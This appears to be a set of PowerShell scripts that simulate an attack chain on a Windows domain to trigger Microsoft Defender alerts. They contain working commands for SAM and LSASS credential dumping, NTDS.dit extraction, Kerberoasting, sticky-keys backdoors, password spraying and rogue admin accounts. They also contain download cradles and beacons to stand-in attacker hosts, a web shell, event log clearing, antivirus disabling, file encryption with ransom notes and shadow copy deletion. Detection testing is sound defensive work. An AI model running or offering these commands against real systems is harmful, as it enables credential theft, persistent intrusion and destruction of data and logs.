# 1. Credential dump
reg save HKLM\SAM C:\Windows\Temp\s1.hiv /y; reg save HKLM\SYSTEM C:\Windows\Temp\s2.hiv /y; Start-Sleep 3; Remove-Item C:\Windows\Temp\s1.hiv,C:\Windows\Temp\s2.hiv -EA 0

# 2. Certutil LOLBin
certutil -urlcache -split -f "http://evil.com/payload.exe" C:\Windows\Temp\b.exe; Remove-Item C:\Windows\Temp\b.exe -EA 0

# 3. Sticky Keys backdoor
New-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" -Force; New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" -Name Debugger -Value cmd.exe -Force; Start-Sleep 5; Remove-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" -Force

# 4. Scheduled task
schtasks /create /tn "WinUpdate" /tr "powershell.exe -nop -w hidden -c whoami" /sc onlogon /ru SYSTEM /f; Start-Sleep 5; schtasks /delete /tn "WinUpdate" /f

# 5. Password spray
@("admin","guest","backup","sqlsvc","webadmin","service") | %{ net use \\10.0.1.5\IPC$ /user:CORP\$_ "Password123!" 2>&1 | Out-Null; net use \\10.0.1.5\IPC$ /delete /y 2>&1 | Out-Null }

# 6. Event log clear
wevtutil cl "Windows PowerShell"

# 7. Service creation
sc.exe create HelperSvc binPath= "cmd.exe /c whoami" start= auto; Start-Sleep 3; sc.exe delete HelperSvc

# DC Phase 1 - Recon
$ErrorActionPreference = "SilentlyContinue"
Write-Host "PHASE 1 - RECONNAISSANCE"
whoami /all | Out-Null
net user | Out-Null
net localgroup Administrators | Out-Null
net user /domain | Out-Null
net group "Domain Admins" /domain | Out-Null
net group "Enterprise Admins" /domain | Out-Null
net group "Schema Admins" /domain | Out-Null
systeminfo | Out-Null
ipconfig /all | Out-Null
nltest /dclist:corp.contoso.com | Out-Null
nltest /domain_trusts | Out-Null
dsquery computer -limit 100 | Out-Null
dsquery user -limit 100 | Out-Null
netstat -ano | Out-Null
Get-NetTCPConnection | Out-Null
arp -a | Out-Null
nslookup corp.contoso.com | Out-Null
Write-Host "Recon DONE"



# DC Phase 2 - Credential Access
$ErrorActionPreference = "SilentlyContinue"
Write-Host "PHASE 2 - CREDENTIAL ACCESS"

Write-Host "LSASS access..."
try {
    $lsass = Get-Process -Name "lsass"
    [System.Diagnostics.Process]::GetProcessById($lsass.Id) | Out-Null
    Write-Host "LSASS handle obtained"
} catch { Write-Host "LSASS blocked" }

Write-Host "LSASS dump via comsvcs..."
$p = (Get-Process lsass).Id
cmd.exe /c "rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $p C:\Windows\Temp\d.dmp full" 2>$null
Remove-Item "C:\Windows\Temp\d.dmp" -Force -ErrorAction SilentlyContinue

Write-Host "NTDS.dit via VSS..."
vssadmin create shadow /for=C: 2>$null | Out-Null
cmd.exe /c "copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Windows\Temp\n.dit" 2>$null
Remove-Item "C:\Windows\Temp\n.dit" -Force -ErrorAction SilentlyContinue
vssadmin delete shadows /for=C: /quiet 2>$null | Out-Null

Write-Host "DCSync replication..."
repadmin /replsummary | Out-Null

Write-Host "Kerberoasting..."
try {
    $s = New-Object System.DirectoryServices.DirectorySearcher
    $s.Filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
    $s.SearchRoot = [ADSI]""
    $r = $s.FindAll()
    foreach ($x in $r) {
        $e = $x.GetDirectoryEntry()
        foreach ($spn in $e.servicePrincipalName) {
            try {
                Add-Type -AssemblyName System.IdentityModel
                New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn | Out-Null
                Write-Host "TGS: $spn"
            } catch {}
        }
    }
} catch {}

Write-Host "Credential Manager..."
cmdkey /list | Out-Null

Write-Host "Credential Access DONE"



# DC Phase 3 - Privilege Escalation
$ErrorActionPreference = "SilentlyContinue"
Write-Host "PHASE 3 - PRIVILEGE ESCALATION"

Write-Host "Sticky Keys backdoor..."
$rp = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
New-Item -Path $rp -Force | Out-Null
New-ItemProperty -Path $rp -Name "Debugger" -Value "cmd.exe" -Force | Out-Null
Start-Sleep 10
Remove-Item -Path $rp -Force -ErrorAction SilentlyContinue

Write-Host "Utilman backdoor..."
$rp2 = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe"
New-Item -Path $rp2 -Force | Out-Null
New-ItemProperty -Path $rp2 -Name "Debugger" -Value "cmd.exe" -Force | Out-Null
Start-Sleep 10
Remove-Item -Path $rp2 -Force -ErrorAction SilentlyContinue

Write-Host "PrivEsc DONE"



# DC Phase 4 - Lateral Movement
$ErrorActionPreference = "SilentlyContinue"
Write-Host "PHASE 4 - LATERAL MOVEMENT"

Write-Host "SMB share probing..."
$ip = "10.0.1.5"
net use "\\$ip\C$" /user:corp\fakeadmin "Wrong1!" 2>$null | Out-Null
net use "\\$ip\ADMIN$" /user:corp\fakeadmin "Wrong1!" 2>$null | Out-Null
net use "\\$ip\IPC$" /user:corp\fakeadmin "Wrong1!" 2>$null | Out-Null

Write-Host "WinRM attempt..."
try {
    $c = New-Object PSCredential("corp\fakeuser", (ConvertTo-SecureString "Wrong!" -AsPlainText -Force))
    Invoke-Command -ComputerName $ip -Credential $c -ScriptBlock { hostname } -ErrorAction Stop
} catch { Write-Host "WinRM failed (expected)" }

Write-Host "Password spray..."
$users = @("administrator","guest","krbtgt","DefaultAccount","svc_backup","svc_sql","helpdesk")
foreach ($u in $users) {
    net use \\$ip\IPC$ /user:corp\$u "Spring2026!" 2>$null | Out-Null
    net use \\$ip\IPC$ /delete 2>$null | Out-Null
    Start-Sleep 1
}

Write-Host "Lateral Movement DONE"

# DC Phase 5 - Persistence
$ErrorActionPreference = "SilentlyContinue"
Write-Host "PHASE 5 - PERSISTENCE"

Write-Host "Scheduled task..."
schtasks /create /tn "WinUpdate" /tr "powershell.exe -WindowStyle Hidden -Command Get-Process" /sc daily /st 02:00 /f 2>$null | Out-Null
Start-Sleep 15
schtasks /delete /tn "WinUpdate" /f 2>$null | Out-Null

Write-Host "Registry run key..."
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SecUpd" /t REG_SZ /d "powershell.exe -WindowStyle Hidden -Command Get-Date" /f 2>$null | Out-Null
Start-Sleep 15
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SecUpd" /f 2>$null | Out-Null

Write-Host "Backdoor local account..."
net user backdoor P@ssw0rd123! /add 2>$null | Out-Null
net localgroup Administrators backdoor /add 2>$null | Out-Null
Start-Sleep 15
net user backdoor /delete 2>$null | Out-Null

Write-Host "Domain account manipulation..."
net user tempattacker P@ssw0rd123! /add /domain 2>$null | Out-Null
net group "Domain Admins" tempattacker /add /domain 2>$null | Out-Null
Start-Sleep 15
net group "Domain Admins" tempattacker /delete /domain 2>$null | Out-Null
net user tempattacker /delete /domain 2>$null | Out-Null

Write-Host "Domain service account..."
dsadd user "CN=svc_update,CN=Users,DC=corp,DC=contoso,DC=com" -pwd "P@ssw0rd123!" -disabled no 2>$null | Out-Null
Start-Sleep 15
dsrm "CN=svc_update,CN=Users,DC=corp,DC=contoso,DC=com" -noprompt 2>$null | Out-Null

Write-Host "Persistence DONE"



# DC Phase 6 - Exfil and C2
$ErrorActionPreference = "SilentlyContinue"
Write-Host "PHASE 6 - EXFIL AND C2"

Write-Host "Data staging..."
$d = "$env:TEMP\stg"
New-Item -ItemType Directory -Path $d -Force | Out-Null
"CONFIDENTIAL DATA" | Out-File "$d\secrets.txt"
"Financial data" | Out-File "$d\finance.csv"
Compress-Archive -Path "$d\*" -DestinationPath "$env:TEMP\exfil.zip" -Force -ErrorAction SilentlyContinue
Remove-Item $d -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\exfil.zip" -Force -ErrorAction SilentlyContinue

Write-Host "C2 beacons..."
$c2 = @("evil-command-server.com","malicious-c2.net","bad-actor-domain.org","apt-callback.xyz","data-exfil-server.ru")
foreach ($x in $c2) {
    try { Resolve-DnsName $x -ErrorAction SilentlyContinue | Out-Null } catch {}
    try { Invoke-WebRequest -Uri "https://$x/beacon" -TimeoutSec 3 -ErrorAction SilentlyContinue | Out-Null } catch {}
    Write-Host "Beacon: $x"
    Start-Sleep 2
}

Write-Host "DNS tunneling..."
$dns = @("exfil-chunk1.evil-dns.com","exfil-chunk2.evil-dns.com","c2-response.evil-dns.com")
foreach ($d in $dns) {
    try { Resolve-DnsName $d -ErrorAction SilentlyContinue | Out-Null } catch {}
    Start-Sleep 2
}

Write-Host "Exfil + C2 DONE"



# DC Phase 7 - Defense Evasion and Execution
$ErrorActionPreference = "SilentlyContinue"
Write-Host "PHASE 7 - DEFENSE EVASION"

Write-Host "Clearing event logs..."
wevtutil cl Security 2>$null
wevtutil cl System 2>$null
wevtutil cl Application 2>$null
wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null

Write-Host "AV tamper..."
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Start-Sleep 3
    Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
} catch {}

Write-Host "Encoded command..."
$cmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Get-Process; whoami"))
powershell.exe -EncodedCommand $cmd 2>$null | Out-Null

Write-Host "Timestomping..."
$f = "$env:TEMP\ts.txt"
"test" | Out-File $f
(Get-Item $f).CreationTime = "01/01/2020 00:00:00"
(Get-Item $f).LastWriteTime = "01/01/2020 00:00:00"
Remove-Item $f -Force -ErrorAction SilentlyContinue

Write-Host "WMI execution..."
wmic process list brief 2>$null | Out-Null
wmic os get caption 2>$null | Out-Null

Write-Host "Suspicious cmd..."
cmd.exe /c "echo test > %TEMP%\t.txt & del %TEMP%\t.txt" 2>$null

Write-Host "Defense Evasion + Execution DONE"
Write-Host ""
Write-Host "ALL DC PHASES COMPLETE"


# Generate Initial Access + Ransomware Alerts
# Run DIRECTLY on DC01 and SMB01 via RDP/console
# These techniques reliably trigger MDE alerts in those categories
$ErrorActionPreference = "Continue"

Write-Host "=== INITIAL ACCESS ALERT GENERATION ==="

# T1078.002 - Valid Accounts: Domain Accounts (brute force / password spray)
Write-Host "1. Password spray simulation (T1110.003 + T1078)"
@("admin","backup","sqlsvc","webadmin","helpdesk","finance","hr_admin","itadmin","svc_backup","testuser") | ForEach-Object {
    net use \\10.0.1.5\IPC$ /user:CORP\$_ "Password123!" 2>$null | Out-Null
    net use \\10.0.1.5\IPC$ /delete /y 2>$null | Out-Null
    net use \\10.0.1.5\IPC$ /user:CORP\$_ "Welcome1!" 2>$null | Out-Null
    net use \\10.0.1.5\IPC$ /delete /y 2>$null | Out-Null
    net use \\10.0.1.5\IPC$ /user:CORP\$_ "Summer2026!" 2>$null | Out-Null
    net use \\10.0.1.5\IPC$ /delete /y 2>$null | Out-Null
    net use \\10.0.1.4\IPC$ /user:CORP\$_ "Password123!" 2>$null | Out-Null
    net use \\10.0.1.4\IPC$ /delete /y 2>$null | Out-Null
}
Write-Host "  Password spray: 40 attempts across 10 accounts"
Start-Sleep 3

# T1078 - Suspicious account creation (triggers Initial Access + Persistence)
Write-Host "2. Rogue account creation (T1136 + T1078)"
net user InitialAccess1 P@ssw0rd123! /add /y 2>$null
net user InitialAccess2 P@ssw0rd123! /add /y 2>$null
net localgroup Administrators InitialAccess1 /add 2>$null
Start-Sleep 5

# T1078 - Account manipulation  
Write-Host "3. Account manipulation (T1098)"
net user InitialAccess1 NewP@ss789! 2>$null
Start-Sleep 3

# T1059.001 - Suspicious PowerShell download cradles (Initial Access tooling)
Write-Host "4. Download cradle simulation (T1059.001 + T1105)"
try { (New-Object Net.WebClient).DownloadString("http://evil-initial-access.com/payload.ps1") } catch {}
try { Invoke-WebRequest -Uri "http://malicious-dropper.net/stage1.exe" -OutFile "$env:TEMP\stage1.exe" -TimeoutSec 3 -ErrorAction SilentlyContinue } catch {}
try { Invoke-Expression (New-Object Net.WebClient).DownloadString("http://attack-framework.org/implant") } catch {}
try { certutil -urlcache -split -f "http://evil-payload.com/initial.exe" "$env:TEMP\initial.exe" 2>$null } catch {}
try { bitsadmin /transfer evil /download /priority high "http://malware-server.com/dropper.exe" "$env:TEMP\dropper.exe" 2>$null } catch {}
Remove-Item "$env:TEMP\stage1.exe","$env:TEMP\initial.exe","$env:TEMP\dropper.exe" -ErrorAction SilentlyContinue
Start-Sleep 3

# T1190 - Exploit Public-Facing Application (simulated web shell drop)
Write-Host "5. Web shell simulation (T1505.003)"
$webshellContent = '<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe","/c whoami"); %>'
$webshellPaths = @("C:\inetpub\wwwroot\shell.aspx", "C:\Windows\Temp\shell.aspx", "C:\Windows\Temp\cmd.aspx")
foreach ($p in $webshellPaths) {
    try { $webshellContent | Out-File $p -ErrorAction SilentlyContinue } catch {}
}
Start-Sleep 5
foreach ($p in $webshellPaths) { Remove-Item $p -Force -ErrorAction SilentlyContinue }

# T1133 - External Remote Services (suspicious RDP/remote logons)
Write-Host "6. Failed remote logon attempts (T1133 + T1021.001)"
@("10.0.1.4","10.0.1.5") | ForEach-Object {
    cmdkey /add:$_ /user:CORP\fakeadmin /pass:FakePass123 2>$null
    mstsc /v:$_ 2>$null
    Start-Sleep 2
    cmdkey /delete:$_ 2>$null
}
Start-Sleep 3

# T1566 - Phishing simulation (suspicious Office-like child processes)
Write-Host "7. Office child process simulation (T1566.001)"
Start-Process cmd.exe -ArgumentList "/c powershell.exe -nop -w hidden -c `"Write-Host phish`"" -ErrorAction SilentlyContinue
Start-Process cmd.exe -ArgumentList "/c certutil -urlcache -split -f http://phishing-payload.com/doc.exe C:\Windows\Temp\doc.exe" -ErrorAction SilentlyContinue
Start-Sleep 3
Remove-Item "C:\Windows\Temp\doc.exe" -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "=== RANSOMWARE ALERT GENERATION ==="

# T1486 - Data Encrypted for Impact (Variant 1: mass rename)
Write-Host "8. Ransomware - Mass file rename (T1486)"
$dir1 = "C:\temp\ransomware_sim1"
New-Item -ItemType Directory $dir1 -Force | Out-Null
1..30 | ForEach-Object { "Q4 Financial Report - Confidential Data Row $_" | Out-File "$dir1\report_$_.docx" }
1..20 | ForEach-Object { "Employee SSN: 123-45-$($_.ToString('D4'))" | Out-File "$dir1\employee_$_.xlsx" }
1..10 | ForEach-Object { "Customer PII Record $_" | Out-File "$dir1\customer_$_.csv" }
Get-ChildItem "$dir1\*.*" -Exclude "*.ENCRYPTED","*.txt" | Rename-Item -NewName { $_.Name + ".ENCRYPTED" }
"ALL YOUR FILES HAVE BEEN ENCRYPTED`nPAY 5 BTC TO: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh`nContact: darkweb@onion.tor" | Out-File "$dir1\RANSOM_NOTE.txt"
Write-Host "  60 files renamed to .ENCRYPTED"
Start-Sleep 5

# T1486 - Data Encrypted for Impact (Variant 2: XOR encryption)
Write-Host "9. Ransomware - XOR encryption (T1486)"
$dir2 = "C:\temp\ransomware_sim2"
New-Item -ItemType Directory $dir2 -Force | Out-Null
1..25 | ForEach-Object { "CONFIDENTIAL: Board Meeting Notes - Strategic Plan $_" | Out-File "$dir2\boardnotes_$_.docx" }
1..15 | ForEach-Object { "Database Export - Production Row $_" | Out-File "$dir2\database_$_.sql" }
Get-ChildItem "$dir2\*.*" -Exclude "*.LOCKED","*.txt" | ForEach-Object {
    $bytes = [IO.File]::ReadAllBytes($_.FullName)
    for ($i = 0; $i -lt $bytes.Length; $i++) { $bytes[$i] = $bytes[$i] -bxor 0x42 }
    [IO.File]::WriteAllBytes("$($_.FullName).LOCKED", $bytes)
    Remove-Item $_.FullName
}
"YOUR NETWORK HAS BEEN COMPROMISED`nFiles encrypted with military-grade encryption`nPayment: 10 BTC`nDeadline: 72 hours" | Out-File "$dir2\DECRYPT_INSTRUCTIONS.txt"
Write-Host "  40 files XOR encrypted to .LOCKED"
Start-Sleep 5

# T1486 - Data Encrypted for Impact (Variant 3: byte reversal)
Write-Host "10. Ransomware - Byte reversal encryption (T1486)"
$dir3 = "C:\temp\ransomware_sim3"
New-Item -ItemType Directory $dir3 -Force | Out-Null
1..20 | ForEach-Object { "Patient Medical Record #$_ - HIPAA Protected" | Out-File "$dir3\patient_$_.pdf" }
1..15 | ForEach-Object { "Source Code - Proprietary Module $_" | Out-File "$dir3\source_$_.py" }
Get-ChildItem "$dir3\*.*" -Exclude "*.CRYPTED","*.txt" | ForEach-Object {
    $bytes = [IO.File]::ReadAllBytes($_.FullName)
    [array]::Reverse($bytes)
    [IO.File]::WriteAllBytes("$($_.FullName).CRYPTED", $bytes)
    Remove-Item $_.FullName
}
"RANSOMWARE: DarkSide v3.0`nAll files encrypted. No free decryptor available.`nContact us at darkside.onion" | Out-File "$dir3\README_DECRYPT.txt"
Write-Host "  35 files byte-reversed to .CRYPTED"
Start-Sleep 5

# T1490 - Inhibit System Recovery (common ransomware behavior)
Write-Host "11. Shadow copy deletion attempt (T1490)"
vssadmin delete shadows /all /quiet 2>$null
wmic shadowcopy delete 2>$null
bcdedit /set {default} recoveryenabled no 2>$null
Start-Sleep 3
bcdedit /set {default} recoveryenabled yes 2>$null

# T1489 - Service Stop (ransomware stops backup/security services)
Write-Host "12. Service stop simulation (T1489)"
@("VSS","wbengine","SstpSvc") | ForEach-Object {
    Stop-Service $_ -Force -ErrorAction SilentlyContinue 2>$null
    Start-Sleep 1
    Start-Service $_ -ErrorAction SilentlyContinue 2>$null
}

# Additional ransomware indicators
Write-Host "13. Ransomware note in multiple locations"
$note = "YOUR FILES ARE ENCRYPTED - PAY RANSOM OR LOSE DATA FOREVER"
$note | Out-File "C:\Users\Public\Desktop\RANSOM.txt" -ErrorAction SilentlyContinue
$note | Out-File "C:\Windows\Temp\RANSOM.txt" -ErrorAction SilentlyContinue
$note | Out-File "$env:USERPROFILE\Desktop\RANSOM.txt" -ErrorAction SilentlyContinue
Start-Sleep 3

Write-Host ""
Write-Host "=== CLEANUP ==="
# Remove rogue accounts
net user InitialAccess1 /delete 2>$null
net user InitialAccess2 /delete 2>$null
# Remove ransomware simulation files (keep for 30 sec for detection)
Start-Sleep 30
Remove-Item "C:\temp\ransomware_sim1" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "C:\temp\ransomware_sim2" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "C:\temp\ransomware_sim3" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "C:\Users\Public\Desktop\RANSOM.txt" -Force -ErrorAction SilentlyContinue
Remove-Item "C:\Windows\Temp\RANSOM.txt" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:USERPROFILE\Desktop\RANSOM.txt" -Force -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "=== DONE ==="
Write-Host "Expected alerts (15-60 min to appear in Defender portal):"
Write-Host "  INITIAL ACCESS:"
Write-Host "    - Suspicious account creation"
Write-Host "    - Password spray activity"  
Write-Host "    - Suspicious download / LOLBin abuse (certutil, bitsadmin)"
Write-Host "    - Suspicious PowerShell download cradle"
Write-Host "    - Web shell drop attempt"
Write-Host "    - Failed remote logon attempts"
Write-Host "  RANSOMWARE:"
Write-Host "    - Ransomware activity / File encryption detected"
Write-Host "    - Suspicious file rename (mass extension change)"
Write-Host "    - Shadow copy deletion (recovery inhibition)"
Write-Host "    - Suspicious service stop"
Write-Host "    - Ransom note creation"
